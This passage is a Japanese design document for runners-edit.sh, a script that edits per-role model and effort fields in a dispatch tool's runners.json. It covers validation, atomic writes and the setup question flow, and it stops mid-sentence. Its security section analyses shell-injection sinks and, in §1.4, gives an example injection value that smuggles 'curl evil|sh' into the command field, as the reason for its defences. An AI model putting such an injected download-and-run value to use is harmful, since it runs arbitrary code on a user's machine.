# cmux-team-dispatch-task `--setup` での役割別 model / effort 設定の設計

対象: `apps/cmux-team-dispatch-task`

## 背景

`runners.json` の runner レコードは v1.20.0 以降、役割ごとの model と effort を
6 つの任意フィールドとして持つ。

| フィールド | 役割 |
|---|---|
| `plan_model` / `plan_effort` | design（plan / superpowers / prewarm design standby） |
| `review_model` / `review_effort` | review（Phase A-R / Phase B-R のレビューペイン） |
| `exec_model` / `exec_effort` | exec（execute / executor standby） |

この 6 フィールドは **engine 中立**で、claude runner でも codex runner でも同じ名前で
解決される。解決順序も既定値も既に実装済みで、`launch-workspace.sh` /
`prewarm-panes.sh` / `--override` のすべてがこれを読む。

欠けているのは**書き込み側だけ**である。値を入れる経路は 2 つしかない。

1. **First-run setup** — `runners.json` が存在しないときにだけ走る。既に登録された
   runner のフィールドを後から変えることはできない。
2. **JSON の手編集** — `~/.claude/cmux-team-dispatch-task/runners.json` を直接開く。

`--setup` は runner（`design_runner` / `review_runner` / `exec_choice`）を選ばせるが、
その runner が**どのモデルでどの effort で動くか**は選ばせない。「レビューだけ effort を
上げたい」「exec を `fable` にしたい」といった、最も頻度の高い調整が `--setup` から
到達できない。

## 目的

`--setup` から、登録済み runner の **3 役割 × 2 次元 = 6 フィールドすべて**を設定・変更・
既定へ戻すことができるようにする。JSON の手編集を不要にする。

## 非目標

以下は明示的に扱わない。

- 解決ロジック・既定値・優先順位の変更。`launch-workspace.sh` / `prewarm-panes.sh` /
  `--override` は 1 行も変えない。
- `config.json` への新キー追加。model / effort は `runners.json` に属し、config の
  役割キー 5 つ（`design_runner` / `review_runner` / `exec_choice` / `review_mode` /
  `prewarm`）は不変。
- runner の追加・削除、`name` / `command` / `engine` / `default` の変更。これらは
  First-run setup と `--reset runners` の担当のまま。
- **First-run setup の書き込み経路を新スクリプトへ移行すること。** 現行のまま動いており、
  触れば回帰リスクだけが増える。この結果、`runners.json` の**新規作成と再構築は今後も
  スクリプトを通らない**。§1.5 と §3.1 の見出し文言はこの事実と矛盾しないよう書く。
- 1 回の `--setup` で複数の runner を編集すること。M1 は単一選択で、2 件目は `--setup`
  を再実行する。`multiSelect` にすると M2 / M3 の選択肢が runner ごとに変わり、
  3 コール構成が崩れる。
- `--setup` の排他規則（`--loop` / `--reset` / `--override`）と「ディスパッチしない」
  性質の変更。
- バージョン番号の bump、push、PR 作成。

## 前提として守る事実

| 項目 | 内容 |
|---|---|
| 未設定時の既定 model | plan: claude `opus[1m]` / codex なし、review: claude `opus[1m]` / codex は reviewer に選ぶなら必須、exec: claude `sonnet` / codex なし |
| 未設定時の既定 effort | plan `xhigh` / review `xhigh` / exec `high`（両 engine 共通） |
| effort allowlist | claude `low\|medium\|high\|xhigh\|max`、codex `minimal\|low\|medium\|high\|xhigh`。**codex に `max` は決して出さない** |
| model 文字列 | **モデル名の allowlist は作らない**（新しいモデル名がそのまま通ること）。ただしシェルメタ文字と制御文字は拒否する。§1.3 と「タスク指示からの意図的な逸脱」節を参照 |
| AskUserQuestion 上限 | 1 コール 4 問、1 問 4 選択肢。"Other" 自由入力欄は自動で付き、この 4 枠を消費しない |
| 原子的書き込み | writer 固有 `mktemp` + `jq` + jq 成功時のみ `mv`。他コンポーネント所有のキーを消さない |

**解決順序の帰結（設計上きわめて重要）**: `launch-workspace.sh` の解決は
「明示 `--model` / `--effort` > runner フィールド > 既定値」なので、
**claude の model と両 engine の effort では「既定値を明示的に書く」と「フィールドを削除する」
の実効値が完全に一致する**。実効差があるのは codex の `plan_model` / `exec_model` /
`review_model` だけ（未設定 = `--model` を付けない = codex 側デフォルト。`review_model`
だけは未設定が「reviewer に選べない」を意味する）。§2.4 の選択肢生成はこの事実に基づく。

`config.json` の `shell_ready_ms`（`terminal-wait.sh` 所有）が生き残らねばならないのと
同じ理由で、`runners.json` でも「編集対象でない runner」「編集対象でないフィールド」
「`default` キー」が生き残らねばならない。

---

## 設計

### 1. 書き込み口 — 新規スクリプト `skills/cmux-team-dispatch-task/scripts/runners-edit.sh`

`runners.json` への**フィールド単位の更新**は、`config-edit.sh` と同一の契約を持つ
**専用スクリプト**を新設して一本化する。

パスは `config-edit.sh` と同じ `skills/cmux-team-dispatch-task/scripts/` 配下。
ドキュメント中の呼び出しは `<SKILL_DIR>/scripts/runners-edit.sh` と書く
（`apps/cmux-team-dispatch-task/scripts/` は `claude-link.sh` 専用で、こちらではない）。

#### 1.1 なぜ新規スクリプトなのか

3 案を検討した。

| 案 | 判定 | 理由 |
|---|---|---|
| **新規 `runners-edit.sh`** | **採用** | 対象ファイル・スキーマ・検証ドメインのいずれも `config.json` と別物。`config-edit.sh` と同型の契約を持たせれば、読む側の認知負荷は増えない |
| `config-edit.sh` を拡張 | 却下 | `known_key` / `valid_value` の「5 キー allowlist」モデルと `--config` という引数名が壊れる。単一オブジェクトのキー更新と配列要素の部分更新という別種の操作が 1 スクリプトに混ざり、`test-config-edit.sh` CE5「未知キーは exit 2」契約とも衝突する |
| SKILL.md / setup-mode.md にインライン jq | 却下 | `setup-mode.md` 自身の「Never hand-assemble a jq invocation for these files」に真正面から反する。`config-edit.sh` が生まれた動機（呼び出しごとに jq を組み立て直すことで起きるマージ漏れ）は、配列要素の部分更新ではさらに深刻になる |

新規スクリプトにしかできないことが 2 つある。

1. **effort の検証に必要な `engine` は編集対象レコード自身に書いてある。** スクリプトなら
   `--set plan_effort=max` を受け取った時点でレコードから `engine` を読み、codex runner
   なら `max` を弾ける。インライン jq では「呼び出し側が engine を正しく渡す」ことを
   毎回祈ることになる。
2. **値を jq プログラム文字列へ補間しない保証**（§1.4）を、テスト可能な 1 箇所に
   閉じ込められる。

#### 1.2 インターフェース

```
runners-edit.sh --runners <path> --name <runner> [--set <field>=<value>]... [--unset <field>]... [--dry-run]
runners-edit.sh --runners <path> --name <runner> --get <field>
runners-edit.sh --runners <path> [--name <runner>] --show
```

`config-edit.sh` の `--config` / `--set` / `--unset` / `--get` / `--show` と対応する。
追加は `--name`（対象レコード）と `--dry-run`（S6 のプレビュー用）の 2 つだけ。

| 引数 | 意味 |
|---|---|
| `--runners <path>` | 対象 `runners.json`。既定の場所は `~/.claude/cmux-team-dispatch-task/runners.json` だが、パスは呼び出し側が渡す（テスト可能性のため） |
| `--name <runner>` | 対象 runner の `name`。`--set` / `--unset` / `--get` では**必須**。一致件数が 1 でなければ exit 2 |
| `--set <field>=<value>` | フィールドを設定（繰り返し可） |
| `--unset <field>` | フィールドを削除 = 既定へ戻す（繰り返し可）。不在フィールドでも exit 0（冪等） |
| `--dry-run` | `--set` / `--unset` と併用。**temp を作らず何も書かず**、適用後の**当該レコードだけ**を stdout へ出す（`--show --name` と対称）。S6 の after 表示はこれで作る |
| `--get <field>` | 値を stdout へ。未設定なら空文字で exit 0 |
| `--show` | `--name` 併用でそのレコードだけ、省略時はファイル全体を整形出力 |

`--dry-run` を足す理由は §2.5 にある。これが無いと S6 の「after」を作るために呼び出し側が
jq を組み立てることになり、同じファイルの
`Never hand-assemble a jq invocation for these files` と正面衝突する。
**`--dry-run` が「ファイル全体」ではなく「当該レコード」を出すのはこのため** —
全体を出すと呼び出し側がレコードを抜くために jq を必要としてしまい、追加した理由が
消える。全体を出す用途は現時点で誰も必要としていない。
**`--dry-run` は `mktemp` を経由しない**（§1.4 手順 7b）。経由すると書き込み権限の無い
レジストリでプレビューが失敗し、S6 が確認質問へ進めなくなる。

#### 1.3 検証

**フィールド allowlist**（これ以外は exit 2）:

```
plan_model  review_model  exec_model  plan_effort  review_effort  exec_effort
```

`name` / `command` / `engine` / `default` は allowlist に**入れない**。この
スクリプトは runner の同一性には触らない。**`--set` と `--unset` のどちらのフィールド名も
同じ allowlist ゲートを通す**（`config-edit.sh` が `--unset` 分岐でも `known_key` を通し、
CE5 が両方を検査しているのと同型）。

**値の検証**:

- `*_model` — 次の 2 条件のみ。**モデル名の allowlist は作らない。**
  1. 前後の空白を除いて非空であること（空値・空白のみは下流で `--model ''` /
     `--model '   '` になり壊れる）。
  2. `'` `"` `` ` `` `$` `\` を含まず、かつ `[[:cntrl:]]` を 1 文字も含まないこと
     （改行 / CR / タブ / ESC / BEL などすべて）。違反は exit 2。根拠は §1.3.1。
- `*_effort` — レコードの `engine` を読み、engine 別 allowlist と照合する。
  **この検証は `--set <*_effort>` にのみ適用する**（`--unset` は値を持たないので
  engine を必要としない。engine 欠落レコードへの `--unset plan_effort` は exit 0）。
  - `engine: claude` → `low` / `medium` / `high` / `xhigh` / `max`
  - `engine: codex` → `minimal` / `low` / `medium` / `high` / `xhigh`
  - 範囲外は exit 2。**codex に `max` を渡すと必ず失敗する。** codex が `max` を
    受け付けるかは確認されていないので、安全側の分岐を維持する。
  - `engine` がレコードに無い、または上記 2 値以外のときは exit 2（どちらの
    allowlist を適用すべきか決められないため、黙って通さない）。

**構造の検証**:

- `.runners` が配列でなければ **exit 2**。`.runners |= map(…)` はオブジェクトを配列へ
  黙って化けさせるので、型崩れをここで止める。jq に `Cannot iterate over null` を
  出させて exit 1 で済ませてはならない（原因を誤らせる）。
- `--name` に一致する `runners[]` 要素の件数がちょうど 1 でなければ exit 2
  （0 件 = 未登録、2 件以上 = 重複。`runners.json` は `name` の一意性を機械的に
  強制していないので、両方書き換えるより止める方が安全）。

**引数の相互作用**:

- モード排他 — `--set`/`--unset` 群 / `--get` / `--show` のうち、ちょうど 1 つだけを
  指定する。混在は exit 2。モード未指定も exit 2。`--runners` 未指定も exit 2。
- `--set` が `<field>=<value>` 形式でなければ exit 2（`config-edit.sh` の
  `--set must be <key>=<value>` と同型）。
- `--set` / `--unset` / `--get` を `--name` 無しで呼ぶと exit 2。
- 同一フィールドへの `--set` と `--unset` の同時指定は exit 2（jq 合成順に結果が
  依存するため、曖昧なまま通さない）。
- `--dry-run` は `--set`/`--unset` モード専用。`--get` / `--show` との併用は exit 2。

##### 1.3.1 `*_model` でシェルメタ文字を拒否する理由

タスク指示は「モデル文字列は検証しない」と述べており、この規則はその**意図された
範囲（モデル名を allowlist しない）を守りつつ、シェル注入だけを塞ぐ**ものである。
逸脱の扱いは末尾の「タスク指示からの意図的な逸脱」節に記録する。

**シンクは 2 層ある。** model 文字列は `launch-workspace.sh` で
`CLAUDE_MODEL_FLAGS="--model '$MODEL'"`（codex は `CODEX_MODEL_FLAG=" --model '$MODEL'"`）
として組まれ、`SESSION_CMD="zsh -ic \"$CORE_CMD\""` になったあと、
**クォート無しヒアドキュメントで `.cmux-team-dispatch-task-run-<slug>.sh` へリテラル
1 行として書き出され**、`cmux new-workspace --command "bash <runner script>"` で実行される。

| 層 | 引用 | そこで生きている文字 |
|---|---|---|
| bash（runner script の行） | `"…"` | `$` `` ` `` `\` `"` のみ。`;` `\|` `&` `>` `<` `(` `)` `*` `?` `#` 空白はリテラル。非対話なので `!` の history 展開も起きない |
| zsh -ic（内側文字列） | `'…'` | `'` のみ。zsh でも単一引用内では `!` は展開されない |

つまり `$` と `` ` `` を展開するのは zsh 層ではなく **bash 層**である。
「`SESSION_CMD` の引用を直せば済む」という誤読を避けるため、この 2 層構造を明記する。

拒否集合を `'` `"` `` ` `` `$` `\` の 5 文字（＋制御文字）にした根拠:

- この 5 文字は**それぞれ単独で**任意コマンド実行に到達する。
- ルート `CLAUDE.md` 保守手順 27 の集合は `!` を含む 6 文字だが、**`!` は意図的に外している**。
  手順 27 は `parallel-directive.sh` の出力位置（`zsh -ic "… '<prompt>' …"` の対話モード）
  に対する規約であり、model の位置では bash 層が非対話・zsh 層が単一引用のため
  load-bearing ではない。
- 実在するモデル名は `[A-Za-z0-9._\[\]/-]` の範囲に収まる（`opus[1m]` / `sonnet` /
  `fable` / `gpt-5.6-sol` / `gpt-5.6-terra`）ので、この拒否条件は既存値も将来の
  モデル名も壊さない。
- 制御文字を拒否するのは注入対策ではなく、値が `--show` / `--dry-run` / S1 の表 /
  `launch-workspace.sh` のログを通じて**端末と LLM コンテキストへ出力される**ため。
  端末エスケープ列を永続化できる状態を作らない。

`--setup` はこの値を **`runners.json` へ永続化する**ので、一度入ると以後の全ディスパッチで
再実行される。

**既知の限界（重要）**: 検証されるのは **S3 の選択肢 2（`runners-edit.sh` 経由）だけ**である。
**同じ `--setup` 実行の中でも、S3 の選択肢 1（追加）と 3（作り直し）は First-run setup が
`runners.json` へ直接書くので検証されない。** `--override` も同様。これらの経路の変更は
非目標なので手を入れない。したがって **doc には「`--setup` が model を sanitize する」と
読める文言を書かない**こと。目的は「新設する永続化経路を無防備にしない」ことであって、
既存経路の穴を全部塞ぐことではない。

#### 1.4 実行順序と書き込み

**検証はすべて `mktemp` より前に完了する。** これを明文の不変条件とする。

```
0. 引数パース。ファイル非依存の検証をすべてここで済ませる:
     - フィールド allowlist（--set / --unset 両方）
     - --set の <field>=<value> 形式
     - *_model の値検証（§1.3。engine を読む必要が無いので手順 0 が正しい置き場所）
     - モード排他 / モード未指定 / --runners 未指定 / --name 必須
     - 同一フィールドへの --set と --unset の衝突
     - --dry-run の併用可否
   直後に TMP="" と trap 'rm -f "${TMP:-}"' EXIT を設置する（下記）
1. [[ -f "$RUNNERS" ]] を確認。
   - --set / --unset モード（--dry-run 含む）: 通常ファイルでなければ exit 2 (§1.5)
   - --get / --show モード: 不在なら空 / {} を出して exit 0 (§1.5)
   ※ -e ではなく -f を使う。-e だとディレクトリを渡したとき rc=0 で偽成功する
2. DOC=$(jq . "$RUNNERS") で 1 回だけ読み、以後はこの文字列を here-string で流す。
   parse 失敗は exit 1（元ファイル無傷。この時点で temp は 1 件も存在しない）
3. (.runners | type) == "array" を検証。違反は exit 2。
   ※ --name が与えられたときに適用する（--show を --name 無しで呼ぶ経路では
     config-edit.sh:147 と同じく素通し出力にする）
4. --name の一致件数がちょうど 1 であることを検証。違反は exit 2。
   ※ --name が与えられたときに適用する（--show / --get 含む）
5. --set <*_effort> があるときだけ、レコードの engine を読み engine 別 allowlist と
   照合する。違反は exit 2。書き込みモード専用
6. 読み取りモード（--get / --show）はここで結果を出して exit 0
7a. --dry-run: 合成した jq 式を DOC へ当て、当該レコードだけを stdout へ出して exit 0。
    mktemp を経由しない
7b. 通常書き込み: TMP=$(mktemp "$RUNNERS.XXXXXX")。失敗は exit 1
    （「何も書かれていない」旨を stderr へ。config-edit.sh:157-160 と同型）
8. 全 --set / --unset を単一の jq 式へ合成し、1 回の jq 実行で DOC から $TMP へ書く。
   jq 失敗は rm -f "$TMP" + 固有メッセージ + exit 1（下記）
9. mv "$TMP" "$RUNNERS"。mv 自体の失敗も扱う（下記）
```

手順 0〜5 が `mktemp` より前にあることで、検証エラー（exit 2）のたびに temp が
残る事故を構造的に防ぐ。手順 1 が exit 2 のとき親ディレクトリを作らないので、
`config-edit.sh` にある `mkdir -p "$(dirname …)"` は**置かない**（§1.5 によりファイルは
必ず存在するので不要であり、置くと RE13 の経路で空ディレクトリだけ作る副作用が出る）。

手順 2 でファイルを **1 回だけ読む**のは、effort 検証に使った `engine` と実際に書き出す
文書が同一バイト列であることを保証するため。プロセス内で読み直すと、§1.1 が
「新規スクリプトにしかできないこと」の筆頭に挙げた検証の前提が（窓は極小だが）崩れる。

**jq への値の渡し方（セキュリティ上 load-bearing）**:

- `--set` の値は必ず `--arg vN` で渡す。`*_model` も `*_effort` も文字列なので
  `--argjson` は使わない。**値を jq プログラム文字列へ連結してはならない。**
- `--name` も `--arg n` で渡す。
- フィールド名は §1.3 の allowlist に一致した場合に**のみ**、`--set` は `.${field}`、
  `--unset` は `del(.${field})` として式へ埋める。`config-edit.sh:99` と同型の根拠
  コメント（「フィールド名は allowlist 済みなので jq 式へ直接埋めてよい」）を実装に残す。

これを守らないと、`--set plan_model='x", "command": "curl evil|sh'` 相当の入力で
allowlist から意図的に外した `.command` を書き換えられる。`.command` は
`launch-workspace.sh` の `CORE_CMD="$RUNNER_COMMAND …"` で**クォート無し**に連結され
（zsh 関数を runner にできる設計なので意図的）、上記 2 層を通って実行されるため、
次回ディスパッチで任意コマンドが走る。

jq 式は対象 runner だけを写像する形にする。他の要素はそのまま通す。

```
.runners |= map(if .name == $n then (.plan_effort = $v1 | del(.exec_model)) else . end)
```

これにより次が保証される。

- **他の runner レコードの「値」が変わらない**（jq は成功時にファイル全体を再整形するので
  バイト単位では必ず変わる。バイト同一を主張できるのは書き込みが起きないパスだけ）
- `default` キーおよびトップレベルの未知キーが残る
- 編集対象レコード内の、allowlist 外のフィールド（`name` / `command` / `engine` や
  将来追加されるフィールド）が残る = **置換ではなくマージ**

**`trap` の設置位置**:

```bash
TMP=""                                  # set -u 下なので事前初期化が必要
trap 'rm -f "${TMP:-}"' EXIT            # 引数パース直後。mktemp より前に置く
```

`mktemp` の直前ではなく**引数パース直後**に置く。そうしないと mktemp 〜 mv の窓が
SIGINT / SIGTERM / SIGHUP に対して無防備になる。`EXIT` だけで十分で、`INT TERM` の
明示追加は不要。**trap 本体は必ず成功で終わる形（`rm -f` の `-f` を外さない）にする** —
EXIT trap が失敗すると exit 2 が exit 1 に化ける。根拠コメントを実装に残す。

**jq 失敗と `mv` 失敗**:

```bash
jq … <<<"$DOC" > "$TMP" || {
  rm -f "$TMP"
  echo "runners-edit: write failed (jq error); $RUNNERS is unchanged" >&2
  exit 1
}
mv "$TMP" "$RUNNERS" || {
  rm -f "$TMP"
  echo "runners-edit: move failed; $RUNNERS is unchanged" >&2
  exit 1
}
TMP=""                                  # 成功後は trap を無害化
```

`set -euo pipefail` 下で jq 分岐を書かないとスクリプトは jq 自身の終了コード
（runtime error では 5）で死に、「0 / 1 / 2」契約が破れる。`config-edit.sh` の `mv` は
最終行で無防備（`set -e` 任せ）なため、immutable 属性では temp が残りスクリプト固有の
診断も出ない。新規スクリプトではどちらも繰り返さない。

**exit code**: 0 成功 / 1 書き込み・読み取り失敗（ファイルは変更されない）/
2 usage・検証エラー。コードの意味は `config-edit.sh` と同一で、**ファイル不在時の
書き込みモードの扱いだけが意図的に異なる**（§1.5）。

**明記しておく既存挙動（`config-edit.sh` と同一、新規退行ではない）**:

- `mv` は `rename(2)` なので **temp の mode が残り、原ファイルの mode は失われる**
  （`chmod 644` → `600`）。締める方向なのでセキュリティ劣化ではないが、`chmod 444` に
  よる凍結も無言で解除される。
- `runners.json` が symlink のとき、**symlink が通常ファイルに置き換わり、リンク先は
  元のまま**になる。dotfiles からレジストリを symlink する構成では乖離する。
- 読み取りから書き込みまでの read-modify-write 全体は原子的ではない。`rename` の
  原子性が保証するのは「中間状態が観測されない」ことだけで、**並行書き込みは
  last-write-wins** になる。`apps/cmux-team-dispatch-task/CLAUDE.md` 保守項目 19 が
  config.json について同じことを明記しており、文言を揃える。

いずれも `config-edit.sh` と同じ挙動なので、この 3 つは**ドキュメントに書くだけで
実装では変えない**（symlink 解決や排他ロックを新スクリプトにだけ入れると、2 つの
edit スクリプトの挙動が非対称になる）。

#### 1.5 ファイルが存在しない場合

**モードで分ける。**

| モード | ファイル不在時 |
|---|---|
| `--set` / `--unset`（`--dry-run` 含む） | **exit 2**。レジストリを新規作成しない |
| `--get` | 空文字を出して exit 0（`config-edit.sh:134` と同じ） |
| `--show` | `{}` を出して exit 0（`config-edit.sh:143-146` と同じ） |

書き込みで exit 2 にするのは「登録済み runner を編集する」という前提が崩れるため。
レジストリの新規作成は First-run setup の責務であり、この分岐を読み取りモードへ
広げると **S1（現状表示）が `runners.json` 未作成の状態で `--show` を呼べなくなる**。
S1 は S3 の分岐より前に必ず走るので、読み取りは非破壊で exit 0 でなければならない。

---

### 2. `--setup` フローの変更

runtime SoT は `references/setup-mode.md`（日本語ミラー `setup-mode-ja.md`）。

**ユーザー可視文字列は英日の両方を本設計で確定させる。** `check-doc-lang.mjs` は
`*-ja.md` について `empty-translation`（日本語が 1 文字も無い）しか見ないので、
英語ラベルが `setup-mode-ja.md` へ素通りしても機械的には検出できない。以下の表記は
すべて「英語 doc の表記 ↔ 日本語 doc の表記」を対で決める。

#### 2.1 S1 — 現状表示

現行のレジストリ表は name / command / engine + model の 4 列。effort 3 列を足すと
9 列になり、Box drawing 禁止のこの画面では横に溢れる。**転置形**を指定する。

```
runner: ccenec  (command: ccenec, engine: claude)

| role   | model              | effort          |
|--------|--------------------|-----------------|
| plan   | opus[1m]           | max             |
| review | default (opus[1m]) | default (xhigh) |
| exec   | fable              | default (high)  |
```

- 1 runner = **見出し 1 行 + 表 5 行（ヘッダ・区切り・役割 3 行）= 6 行**。
  S1 は S2 / S3 より前に走るので編集対象が未確定であり、全 runner を出さざるを得ない。
  **登録が 5 件を超えるときは、`default` と役割キー（`design_runner` /
  `review_runner` / `exec_choice`）が参照している runner を転置形で出し、残りは
  現行どおり 1 行要約にする。**
- 未設定は空欄ではなく実効値を見せる。EN `default (<value>)` ↔ JA `既定 (<値>)`。
  このラベル形式は First-run setup（`SKILL.md:469-472` の `default (xhigh)` など）の
  先例と一致する。
- **役割キーの `unset` 表示とは表記が違うが、これは正当な区別である。** 役割キーは
  三値（固定値 / `"ask"` / 未設定）なので状態そのものを見せる必要があり
  EN `unset` ↔ JA `未設定`（`setup-mode.md:83` / `setup-mode-ja.md:64` の既存表記）と書く。
  runner フィールドは二値（設定済み / 未設定）で、未設定でも実効値が決まっているので
  実効値を見せる方が有用。
- **例外**: codex runner の model が未設定のときは実効既定値が存在しない。
  - `plan_model` / `exec_model` → EN `unset (codex-side default)` ↔
    JA `未設定（codex 側デフォルト）`
  - `review_model` → EN **`unset (not review-capable)`** ↔
    JA **`未設定（レビュアーに選べません）`**。codex reviewer は `review_model` が
    必須で、未設定は「既定にフォールバックする」ではなく「reviewer に選べない」を
    意味する（§2.4 の警告と対になる）。

#### 2.2 S2 — 質問コール①

Q2「対象」は現行 3 択（役割キーのみ / `runners.json` のみ / 両方）。**選択肢の数と
意味は変えず、3 つすべてのラベルと説明を model / effort が含まれることが分かる形に
そろえる。**

| # | EN ラベル | JA ラベル | description |
|---|---|---|---|
| 1 | `the role keys only` | `役割キーのみ` | EN `per-role models and efforts live in the registry; pick option 2 or 3 to reach them` ↔ JA `役割別の model / effort はレジストリ側にあります。2 か 3 を選ぶと到達できます` |
| 2 | `the runner registry (models and efforts included)` | `runners.json（役割別 model / effort を含む）` | — |
| 3 | `both — the role keys and the registry (models and efforts included)` | `両方 — 役割キーとレジストリ（役割別 model / effort を含む）` | — |

model / effort は `runners.json` の中身なので、対象を 4 つへ増やすと「`runners.json` と
モデル設定の違いは何か」という無意味な区別を利用者に強いる。ラベルと説明だけで
発見可能性を補い、選択肢 1 を選んだ利用者にも到達経路を伝える。

#### 2.3 S3 — `runners.json`（対象に含まれるときだけ）

ファイルが存在するときの選択肢を 3 択から 4 択にする。

| # | 選択肢 | 動作 |
|---|---|---|
| 1 | 追加 | 既存どおり First-run setup の対話で 1 件足す |
| 2 | **登録済み runner の model と effort を編集** | **新規。S3-M へ** |
| 3 | 作り直し | 既存どおりレジストリを再構築 |
| 4 | そのまま | 既存どおり何もしない |

ちょうど AskUserQuestion の 4 選択肢上限に収まる。

**S3-M へ到達しない経路を網羅する。**

- **S2 Q2 で選択肢 1（役割キーのみ）を選んだ** — S3 自体が走らない。
- **ファイル不在時** — 従来どおり First-run setup が走る。First-run setup は
  6 フィールドをその場で収集するので、S3-M は提示せず S4 へ向かう。
- **選択肢 1（追加）/ 3（作り直し）の後** — 同じ理由で S3-M は提示せず S4 へ向かう。
  追加した runner を続けて編集したい場合は `--setup` を再実行する。
- **`runners[]` が空配列のとき** — 選択肢 2 を**出さない**（M1 の選択肢が 0 件になり
  AskUserQuestion の最低 2 選択肢を満たせないため）。
- **1 回の `--setup` で編集できる runner は 1 件**（M1 は単一選択）。

#### 2.4 S3-M — model / effort エディタ（新規）

S3 で選択肢 2 を選んだときだけ走る。**happy path で AskUserQuestion 3 コール**
（再質問経路が 3 本あるので最悪 +3 = 6 コール）。

このサブセクション配下の下位見出しは **`####` を使う**。SU8 は
`^#\{1,3\} ` を数えるので `####` はカウント対象外であり、英日で
**見出しレベル・個数・順序をすべて一致させる**（`####` は両ファイルにとって新しい深さで、
SU8 は不一致を検出できないため、SU15 に個数一致のアサーションを持たせる）。

##### M1. どの runner か（1 問）

選択肢は `runners[]` のエントリ（label = `name`、description = `command (engine)`）。
登録が 5 件以上なら**先頭 4 件を出し、残りは自動 "Other" 自由入力**で受ける。これは
S5 の `design_runner` 選択（`setup-mode.md` の「offer the first four」）が既に使っている
逃がし方であり、新しいパターンを発明しない。

> `--override` の Call 1 は「先頭 **3** 件 + Other」で数え方が違う（`SKILL.md:828-831`）。
> リポジトリ内で規約が割れているので、先例としては S5 だけを引く。

"Other" に登録されていない名前が入力されたら、警告して同じ質問を**もう一度だけ**出す。
2 回目も未登録なら S3-M を中止して S4 へ進む（無限ループにしない。effort / model の
再質問規定と対称）。**新規 runner は作らない**（runner の追加は S3 の選択肢 1 の担当）。

**`'` を含む runner 名は S3-M の対象から除外して警告する。** runner 名は
`runners-edit.sh` が書く値ではなく読む値であり、§1.3 の deny-list の対象外である。
First-run setup は name を無検証で書くので、`'` を含む名前があると S7 が組み立てる
`--name '<runner>'` を単一引用では守れない。

##### M2. model 3 問（1 コール）

`plan_model` / `review_model` / `exec_model` を 1 コールで聞く。

##### M3. effort 3 問（1 コール）

`plan_effort` / `review_effort` / `exec_effort` を 1 コールで聞く。

##### 役割単位ではなく次元単位にした理由

`--override`（Step 1g-2）は「どの役割か」を先に聞いてから役割ごとに 1 コールを出す。
ここでは採らない。

- `--override` はタスクごとに engine が変わりうるので役割単位が自然だが、`--setup`
  では**編集対象の runner が 1 つに固定**されており、6 フィールドすべてが同じ engine
  で解釈される。役割ごとに分ける理由がない。
- 各問の第 1 選択肢が常に「変更なし」なので、「この役割は触らない」は選択肢 1 で
  表現できる。役割選択の前置き質問は情報を増やさない。
- 結果として M1 + M2 + M3 の **3 コール**になる。`--override` を 1 タスク・全 3 ロールに
  適用したときが 5 コール（Call 1 + Call 2 + Call 3×3）なので、同条件で 2 コール少ない。

##### 選択肢の組み立て（静的な表ではなく動的規則）

**静的な選択肢表は作らない。** 既定値を明示的に書くこととフィールドを削除することが
実効同値になる組み合わせが多く（「前提として守る事実」の解決順序の帰結を参照）、
表に固定すると 4 枠のうち 1〜2 枠が常に死ぬ。First-run setup（`SKILL.md:469-472`）も
重複なしで組んでいる。

各問は次の規則で組み立てる。

1. **opt1 = 変更なし。**
   - 現在値が設定済み → EN `keep (<current>)` ↔ JA `変更なし（現在: <現在値>）`
   - 未設定（実効既定値がある） → EN `keep (default: <d>)` ↔ JA `変更なし（既定: <d>）`
   - **未設定かつ codex `plan_model` / `exec_model`**（実効既定値なし） →
     EN `keep (unset — codex-side default)` ↔ JA `変更なし（未設定 — codex 側デフォルト）`
   - **未設定かつ codex `review_model`** →
     EN `keep (unset — not review-capable)` ↔ JA `変更なし（未設定 — レビュアーに選べません）`
2. **opt2 以降 = 候補プールから順に埋める。** プールから
   **現在値**と**実効既定値**を除外したうえで、先頭から順に取る。
3. **最終枠 = 現在値が設定済みで、かつ実効既定値と異なるときだけ**
   EN `back to the default (<d>)` ↔ JA `既定に戻す（<d>）` を置く。
   現在値が実効既定値と一致するとき（`plan_effort: "xhigh"` や
   `plan_model: "opus[1m]"` のようなごく普通の状態）は opt1 と実効同値になるので
   **出さず、候補で埋める**。未設定のときも出さない。
   - **例外**: codex `*_model` は未設定と既定明示が実効的に**異なる**（未設定 =
     `--model` を付けない）。現在値が設定済みなら常に最終枠へ置く。
     `review_model` の場合は description に警告を載せる（後述）。
4. 4 枠に収まらない候補は自動 "Other" 自由入力から到達できる。**ダミーの選択肢は
   置かない。**

**選択肢は必ず 2 つ以上になる。** 現在値が設定済みなら規則 3 が最終枠を足すか、
一致していればプールから現在値 1 件だけが除かれて 4 件以上残る。未設定なら規則 2 の
除外が高々 1 件なのでプールに 2 件以上残る（codex model は候補導出 step 3 が
下限を保証する）。実装者が床を再導出しなくて済むよう、この 1 文を doc にも書く。

**候補プール**（engine 別、この順序）:

| 対象 | プール |
|---|---|
| claude `*_model` | `opus[1m]` / `sonnet` / `fable` |
| codex `*_model` | 下記「codex model 候補の導出」 |
| claude `*_effort` | `max` / `xhigh` / `high` / `medium` / `low` |
| codex `*_effort` | `xhigh` / `high` / `medium` / `low` / `minimal` |

**`max` は claude のプールにしか無い。** codex 側のどの経路（プール / 既定 / "Other"
の受理）にも現れない。この 2 行は `setup-mode.md` / `setup-mode-ja.md` へ
**逐語で焼き込む**（SU12 のアンカーになる。§3 参照）。

例（claude runner、`plan_effort` 未設定 = 実効既定 `xhigh`）:
`keep (default: xhigh)` / `max` / `high` / `medium`
（`xhigh` は既定なので除外、`low` は枠外で "Other" 送り）。

例（claude runner、`plan_effort: "max"`。実効既定 `xhigh` と異なる）:
`keep (max)` / `high` / `medium` / `back to the default (xhigh)`
（`max` は現在値、`xhigh` は実効既定なのでプールから除外）。

例（claude runner、`plan_effort: "xhigh"`。実効既定と一致）:
`keep (xhigh)` / `max` / `high` / `medium`
（規則 3 は最終枠を出さない。`low` は "Other" 送り）。

##### codex model 候補の導出

`runners.json` 全体に出現する codex model 文字列（`engine: codex` のレコードに属する
`plan_model` / `review_model` / `exec_model` の値）を集め、次の順序で確定する。

1. **編集中の当該フィールドの現在値を除外**する（除外しないと opt1 と重複する）。
2. 重複除去し、`runners[]` の**登録順**（同一 runner 内では
   `plan_model` → `review_model` → `exec_model` の順）に並べる。
3. 枠が余ったら First-run setup の先例（"for codex offer free text (e.g. `gpt-5.6-sol`)"）
   に従い `gpt-5.6-sol` を 1 件だけ補充する。
   **補充するのは `gpt-5.6-sol` が step 2 のプールにも「現在値」にも一致しないときだけ。**
   （現在値が `gpt-5.6-sol` のとき step 1 が除去した直後に補充し直すと opt1 と重複する。
